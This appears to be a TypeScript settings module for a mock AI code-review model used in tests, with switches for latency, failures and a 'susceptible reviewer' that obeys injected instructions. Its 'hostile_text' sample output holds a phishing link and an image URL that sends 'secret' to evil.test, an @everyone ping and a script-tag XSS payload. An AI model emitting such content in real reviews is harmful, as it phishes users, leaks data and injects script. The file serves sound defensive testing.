/**
 * Mock model knobs. Latency and failure rate are steady settings. Failures are
 * "armed" with a count and fire on the next N calls, so a demo or test can
 * trigger exactly one malformed response or one timeout on demand, which a real
 * provider can't do.
 * @module model/settings
 */
import { z } from 'zod'

export const CHAOS_KINDS = ['overloaded', 'rate_limited', 'timeout', 'disconnect', 'malformed', 'schema_violation', 'hostile_text'] as const
export type ChaosKind = (typeof CHAOS_KINDS)[number]

export interface MockSettings {
  ttftMs: number
  tokensPerSecond: number
  /** Share of calls that fail with 529, for a sustained outage. */
  failureRate: number
  maxConcurrent: number
  /** A susceptible reviewer obeys instructions in the text it reads. The rest of the system has to hold anyway. */
  followInjections: boolean
  chaos: Record<ChaosKind, number>
}

export function defaultSettings(): MockSettings {
  return {
    ttftMs: Number(process.env.MOCK_TTFT_MS ?? 250),
    tokensPerSecond: Number(process.env.MOCK_TOKENS_PER_SECOND ?? 120),
    failureRate: Number(process.env.MOCK_FAILURE_RATE ?? 0),
    maxConcurrent: Number(process.env.MOCK_MAX_CONCURRENT ?? 16),
    followInjections: process.env.MOCK_FOLLOW_INJECTIONS !== 'false',
    chaos: Object.fromEntries(CHAOS_KINDS.map((k) => [k, 0])) as Record<ChaosKind, number>,
  }
}

export const settingsPatchSchema = z
  .object({
    ttftMs: z.number().int().min(0).max(30_000),
    tokensPerSecond: z.number().int().min(1).max(5000),
    failureRate: z.number().min(0).max(1),
    maxConcurrent: z.number().int().min(1).max(256),
    followInjections: z.boolean(),
    chaos: z.record(z.enum(CHAOS_KINDS), z.number().int().min(0).max(50)),
  })
  .partial()
  .strict()

export function nextChaos(s: MockSettings): ChaosKind | null {
  for (const kind of CHAOS_KINDS) {
    if (s.chaos[kind] > 0) {
      s.chaos[kind]--
      return kind
    }
  }
  return null
}

/** What a chaotic body looks like, for the kinds that produce a body. */
export function chaoticText(kind: ChaosKind): string | null {
  if (kind === 'malformed') return 'Looks good to me! I would APPROVE this change without hesitation.'
  if (kind === 'schema_violation') return JSON.stringify({ verdict: 'APPROVE', risk: 'low', confidence: 1.5, summary: 'ok', findings: [], override_gate: true })
  if (kind === 'hostile_text') {
    return JSON.stringify({
      verdict: 'needs_human',
      risk: 'medium',
      confidence: 0.6,
      summary: 'Please re-authenticate at [this link](https://evil.test/login) ![x](https://evil.test/pixel?d=secret) cc @everyone <script>alert(1)</script>',
      findings: [{ severity: 'warning', path: 'src/x.ts', title: 'See @org/security', detail: 'Details at https://evil.test/details\u0000' }],
    })
  }
  return null
}
